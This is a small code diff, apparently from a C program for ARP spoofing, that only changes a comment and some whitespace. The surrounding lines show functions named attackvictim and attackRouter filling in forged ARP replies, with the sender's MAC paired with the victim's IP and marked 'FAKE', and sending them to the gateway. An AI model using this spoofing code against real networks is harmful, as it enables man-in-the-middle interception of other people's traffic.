@@ -6,7 +6,7 @@ int setArpHeader(PARP_HEADER arpHeader)
 	arpHeader->Protocol_type = ntohs(0x0800);
 	arpHeader->Hardware_size = 0x06;
 	arpHeader->Protocol_size = 0x04;
-	arpHeader->Opcode = ntohs(REPLY); // reply
+	arpHeader->Opcode = ntohs(REPLY);
 	return 0;
 }
 int attackvictim(pcap_t* handle, PARP_PACKET arpPacket, PLANINFO LanInfo)
@@ -37,7 +37,7 @@ int attackRouter(pcap_t* handle, PARP_PACKET arpPacket, PLANINFO LanInfo)
 	memcpy(arpPacket->ethernet.dst_MAC, LanInfo->gatewayMAC, sizeof(u_char) * MACLEN);
 	memcpy(arpPacket->ethernet.src_MAC, LanInfo->myMAC, sizeof(u_char) * MACLEN);
 	memcpy(arpPacket->arp.src_MAC, LanInfo->myMAC, sizeof(u_char) * MACLEN);	// FAKE
-	memcpy(arpPacket->arp.src_IP, &LanInfo->victimIP, sizeof(IN_ADDR));		// FAKE
+	memcpy(arpPacket->arp.src_IP, &LanInfo->victimIP, sizeof(IN_ADDR));			// FAKE
 	memcpy(arpPacket->arp.dst_MAC, LanInfo->gatewayMAC, sizeof(u_char) * MACLEN);
 	memcpy(arpPacket->arp.dst_IP, &LanInfo->gatewayIP, sizeof(IN_ADDR));
 	/* fill Pacekt */
